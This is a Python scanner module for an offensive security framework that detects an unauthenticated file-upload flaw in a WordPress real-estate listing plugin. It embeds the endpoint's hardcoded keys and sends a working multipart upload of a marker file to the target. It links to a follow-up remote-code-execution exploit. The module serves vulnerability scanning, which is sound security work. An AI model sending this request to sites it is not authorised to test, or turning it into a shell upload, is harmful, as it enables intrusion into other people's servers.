#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Realtyna WPL <= 5.2.0 static API file upload (CVE-2026-14483)."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "real-estate-listing-realtyna-wpl"
_VULN_HIGH = (5, 2, 0)
_PUBLIC = "U7hdbv673YhdjplzzX7wU7hdbv673YhdjplzzX7w"
_PRIVATE = "Eft76bdh0o2uyhJkbG3T"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Realtyna WPL CVE-2026-14483 upload detect",
        "description": (
            "Detects CVE-2026-14483: WPL io endpoint accepts multipart upload with "
            "hardcoded public_key/private_key."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-14483",
        "references": ["https://github.com/0xdak/CVE-2026-14483_exploit"],
        "modules": ["exploits/multi/http/realtyna_wpl_cve_2026_14483_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "realtyna", "wpl", "cve-2026-14483"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["exploits/multi/http/realtyna_wpl_cve_2026_14483_upload_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _query(self) -> str:
        return (
            "wplformat=io&wplview=io"
            f"&public_key={_PUBLIC}&private_key={_PRIVATE}"
            "&commands_directory=mobile_application&cmd=set_property&user_id=1&dformat=json"
        )

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        marker = f"CVE14483_{secrets.token_hex(4)}"
        fname = f"ks_{marker}.txt"
        boundary = "----KittyRealtyna"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file[]"; filename="{fname}"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
            f"{marker}\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        r = self.http_request(
            method="POST",
            path=self._join(f"/?{self._query()}"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        text = r.text or ""
        if '"success":true' in text.replace(" ", "") and '"result"' in text:
            self.set_info(
                severity="critical",
                reason="Realtyna CVE-2026-14483 unauthenticated upload accepted",
                path="/?wplformat=io",
                cve="CVE-2026-14483",
            )
            return True
        return False
